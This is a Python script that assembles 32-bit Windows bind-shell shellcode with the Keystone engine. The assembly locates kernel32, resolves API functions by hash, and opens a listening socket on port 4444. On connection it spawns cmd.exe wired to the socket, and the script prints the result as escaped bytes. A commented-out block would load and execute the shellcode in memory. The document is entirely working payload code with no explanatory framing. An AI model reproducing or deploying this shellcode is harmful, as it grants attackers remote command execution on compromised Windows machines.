import ctypes, struct
from keystone import *

CODE2 = '''
    start:
        mov ebp, esp                    ;
        add esp, 0fffff9f0H             ;
    find_kernel32:
        xor ecx,ecx                     ;
        mov esi,fs:[ecx+30h]            ;
        mov esi,[esi+0Ch]               ;
        mov esi,[esi+1Ch]               ;
    next_module:
        mov ebx, [esi+8h]               ;
        mov edi, [esi+20h]              ;
        mov esi, [esi]                  ;
        cmp [edi+12*2], cx              ;
        jne next_module                 ;
    find_function_shorten:
        jmp find_function_shorten_bnc   ;
    find_function_ret:
        pop esi                         ;
        mov [ebp+4H], esi             ;
        jmp resolve_symbols_kernel32    ;
    find_function_shorten_bnc:
        call find_function_ret          ;
    find_function:
        pushad                          ;
        mov eax, [ebx+3ch]             ;
        mov edi, [ebx+eax+78h]         ;
        add edi, ebx                    ;
        mov ecx, [edi+18h]             ;
        mov eax, [edi+20h]             ;
        add eax, ebx                    ;
        mov [ebp-4], eax                ;
    find_function_loop:
        jecxz find_function_finished    ;
        dec ecx                         ;
        mov eax, [ebp-4]                ;
        mov esi, [eax+ecx*4]            ;
        add esi, ebx                    ;
    compute_hash:
        xor eax, eax                    ;
        cdq                             ;
        cld                             ;
    compute_hash_again:
        lodsb                           ;
        test al, al                     ;
        jz compute_hash_finished        ;
        ror edx, 0dH                   ;
        add edx, eax                    ;
        jmp compute_hash_again          ;
    compute_hash_finished:
    find_function_compare:
        cmp edx, [esp+24H]             ;
        jnz find_function_loop          ;
        mov edx, [edi+24H]             ;
        add edx, ebx                    ;
        mov cx, [edx+2*ecx]             ;
        mov edx, [edi+1cH]             ;
        add edx, ebx                    ;
        mov eax, [edx+4*ecx]            ;
        add eax, ebx                   ;
        mov [esp+1cH], eax             ;
    find_function_finished:
        popad                          ;
        ret                            ;

    resolve_symbols_kernel32:
        push 78b5b983h;
        call dword ptr [ebp+4h]        ;
        mov [ebp+10h], eax             ;#Save TerminateProcess address for later

        push 0ec0e4e8eh;
        call dword ptr [ebp+4h]        ;
        mov [ebp+14h], eax             ;#Save LoadLibraryA address for later

        push 16B3FE72h;
        call dword ptr [ebp+4h]        ;
        mov [ebp+2ch], eax             ;#Save CreateProcessA address for later

    load_ws2_32:
        xor eax, eax;
        mov ax, 6c6ch;
        push eax;
        push 642e3233h;
        push 5f327377h;
        push esp;
        call dword ptr [ebp+14h];
        mov ebx, eax                   ;#Move the base address of ws2_32.dll to EBX

        push 3BFCEDCBh
        call dword ptr [ebp+4h]        ;
        mov [ebp+18h], eax             ;#Save WSAStartup address for later

        push 0ADF509D9h;
        call dword ptr [ebp+4h]        ;
        mov [ebp+1ch], eax             ;#Save WSASocketA address for later

        push 0C7701AA4h;
        call dword ptr [ebp+4h]        ;
        mov [ebp+20h], eax             ;#Save Bind address for later

        push 0E92EADA4h;
        call dword ptr [ebp+4h]        ;
        mov [ebp+24h], eax             ;#Save Listen address for later

        push 498649E5h;
        call dword ptr [ebp+4h]        ;
        mov [ebp+28h], eax             ;#Save Accept address for later


    WSAStartup:                        ; #Initialize networking
        xor edx, edx                   ; #Make some stack space
        mov dh, 03h                    ; #sizeof(WSDATA) is 0x190
        sub esp, edx                   ; #Initialize winsock
        push esp                       ; #Use stack for WSADATA
        xor eax, eax;
        mov ax, 0202h;
        push eax                       ; #wVersionRequested
        call dword ptr [ebp+18h]       ; #call WSAStartup
	    add sp, 304h		           ; #Move esp over WSAData
    
    create_socket:
        xor eax, eax;
        push eax;
        push eax;
        push eax;
        mov al, 06h;
        push eax;
        sub al, 05h;
        push eax;
        inc eax;
        push eax;
        call dword ptr [ebp+1ch];
        mov esi, eax;

    Bind:
        xor eax, eax;
        push eax;                      #Push sin_zero[]
        push eax;                      #Push sin_zero[]
        push eax;                      #Push sin_addr
        mov eax, 5C110102h;            #Port 4444
        dec ah;
        push eax;
        mov edi, esp;                  #Store pointer to sockaddr_in in EDI
        xor ebx, ebx;
        mov bl, 10h;
        push ebx;
        push edi;
        push esi;
        call dword ptr [ebp+20h];

    Listen:
        push ebx;
        push esi;
        call dword ptr [ebp+24h];
    
    Accept:
        push ebx;
        mov edx, esp;
        sub esp, ebx;
        mov ecx, esp;
        push edx;                       #addrlen = 0x10
        push ecx;                       #addr = Output structure on stack
        push esi;
        call dword ptr [ebp+28h];
        mov esi, eax;

    initialize_process:
        xor ecx, ecx                    ; #Zero ECX
        mov cl, 54h                     ; #Set the lower order bytes of ECX to 0x54 which will be used to represent the size of the STARTUPINFO and PROCESS_INFORMATION structures on the stack
        sub esp, ecx                    ; #Allocate stack space for the two structures
        mov edi, esp                    ; #set edi to point to the STARTUPINFO structure
        push edi                        ; #Preserve EDI on the stack as it will be modified by the following instructions

	zero_structs:
        xor eax, eax                    ; #Zero EAX
        rep stosb                       ; #Repeat storing zero at the buffer starting at edi until ecx is zero
        pop edi                         ; #restore EDI to its original value

    initialize_structs:
        mov byte ptr [edi], 44h             ; #cb = 0x44 (size of the structure)
        inc byte ptr [edi+2Dh]              ; #Increment byte at offset of 0x2D to make dwFlag = 0x00000100 = STARTF_USESTDHANDLES  0x2C=00
        push edi                        ; #Preserve EDI
        mov eax, esi                    ; #Set EAX to the client file descriptor that was returned by accept
        lea edi, [edi+38h]              ; #Load the effective address of the hStdInput attribute in the STARTUPINFO structure
        stosd                           ; #Set the hStdInput Attribute to the file descriptor returned from accept
        stosd                           ; #Set the hStdOutput Attribute to the file descriptor returned from accept
        stosd                           ; #Set the hStdError Attribute to the file descriptor returned from accept
        pop edi                         ; #Restore EDI

    execute_process:
        xor eax, eax;
        mov ax, 6578h;
        shl eax, 8h;
        mov al, 65h;
        push eax;
        push 2e646d63h;
        push esp;
        pop ebx;
        xor eax, eax                    ; #Zero EAX
        lea esi, [edi+44h]              ; #Load the effective address of the PROCESS_INFORMATION structure into ESI
        push esi                        ; #Push the pointer to the lpProcessInformation structure
        push edi                        ; #Push the pointer to the lpStartupInfo structure
        push eax                        ; #lpStartupDirectory = NULL
        push eax                        ; #lpEnvironment = NULL
        push eax                        ; #dwCreationFlags = 0
        inc eax                         ; #EAX = 1
        push eax                        ; #bIngeritHandles = True
        dec eax                         ; #EAX = 0
        push eax                        ; #lpThreadAttributes = NULL
        push eax                        ; #lpProcessAttributes = NULL
        push ebx;
        push eax;
        call dword ptr [ebp+2ch];

    exit_process:
        xor ecx, ecx;
        push ecx;
        push 0ffffffffh;
        call dword ptr [ebp+10h];
'''


# Initialize engine in 32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE2)
egghunter = ""
for dec in encoding:
    egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n")
print("egghunter = (\"" + egghunter + "\")")

'''
sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
'''
